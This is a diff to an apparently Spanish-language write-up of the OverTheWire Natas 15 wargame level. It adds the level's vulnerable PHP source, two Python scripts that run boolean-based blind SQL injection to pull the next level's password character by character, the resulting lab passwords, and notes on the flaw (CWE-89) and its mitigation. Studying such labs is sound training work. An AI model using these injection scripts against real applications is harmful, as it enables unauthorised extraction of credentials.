@@ -1549,14 +1549,7 @@ if(array_key_exists("username", $_REQUEST)) {
             echo "Access denied!<br>";
     }
     mysqli_close($link);
-} else {
-?>
-<form action="index.php" method="POST">
-Username: <input name="username"><br>
-Password: <input name="password"><br>
-<input type="submit" value="Login" />
-</form>
-<?php } ?>
+}
 ```
 
 ```bash
@@ -1603,4 +1596,169 @@ $stmt->execute();
 ```
 - Si por motivos heredados no se pueden usar consultas preparadas, se debe pasar obligatoriamente cada variable por funciones que escapan los caracteres especiales de SQL, como `mysqli_real_escape_string()`, antes de concatenarla.
 - Configurar la cuenta de conexión del servidor web a la base de datos para que solo posea los permisos mínimos necesarios (por ejemplo, solo SELECT en la tabla users), limitando el impacto en caso de sufrir otra inyección.
+</Callout>
+
+## Natas Level 14 → Level 15
+
+[Natas Level 14 → Level 15](https://overthewire.org/wargames/natas/natas15.html)
+
+Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
+```bash
+curl http://natas15.natas.labs.overthewire.org/ --user natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas15", "pass": "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g" };</script></head>
+<body>
+<h1>natas15</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+}
+```
+
+`pass_length.py`
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+url = "http://natas15.natas.labs.overthewire.org/"
+auth = HTTPBasicAuth("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
+
+payload = {
+        "username": 'natas16" AND LENGTH(password)=32 #'
+}
+
+r = requests.get(url, params=payload, auth=auth)
+
+if "This user exists" in r.text:
+    print("True")
+else:
+    print("False")
+```
+
+```bash
+python3 pass_length.py 
+```
+
+```plaintext
+True
+```
+
+`sqli.py`
+
+```python
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from pwn import *
+import requests
+import string
+
+URL = "http://natas15.natas.labs.overthewire.org/"
+AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
+
+CHARSET = string.ascii_letters + string.digits
+password = ["?"] * 32
+
+session = requests.Session()
+session.auth = AUTH
+
+p = log.progress("Password")
+
+def find_char(pos):
+    for c in CHARSET:
+        payload = {
+                "username": f'natas16" AND BINARY SUBSTRING(password,{pos},1)="{c}" #'
+                }
+
+        r = session.get(URL, params=payload)
+
+        if "This user exists." in r.text:
+            return pos, c
+
+    return pos, "?"
+
+with ThreadPoolExecutor(max_workers=10) as executor:
+    futures = [executor.submit(find_char, i) for i in range(1, 33)]
+
+    for future in as_completed(futures):
+        pos, char = future.result()
+        password[pos - 1] = char
+        p.status("".join(password))
+
+
+p.success("".join(password))
+```
+
+```bash
+python3 sqli.py 
+```
+
+```plaintex
+[+] Password: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
+```
+
+<Callout type="success" title="Password natas16">
+Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+Se trata de una vulnerabilidad de Blind SQL Injection (Boolean-Based) (inyección SQL a ciegas basada en respuestas booleanas). El código sigue concatenando el input directamente sin usar parameterized queries, pero a diferencia del nivel anterior, la aplicación no refleja registros ni errores en la interfaz web; solo devuelve un estado binario ("This user exists" o "This user doesn't exist"). Un atacante puede realizar preguntas con respuestas lógicas de sí/no e inyectar funciones como SUBSTRING() y BINARY para forzar condiciones condicionales y exfiltrar la contraseña de forma asíncrona mediante fuerza bruta posicional.
+- [**CWE-89** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
+- [**CWE-20** Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- Separar completamente el código de los datos mediante consultas parametrizadas anula por completo la vulnerabilidad, haciendo imposible que el motor evalúe condiciones lógicas (`AND`, `OR`, `BINARY`) introducidas por el cliente.
+- Devolver mensajes genéricos para no dar pistas analíticas sobre la existencia exacta de registros específicos, mitigando parcialmente ataques de User Enumeration.
 </Callout>
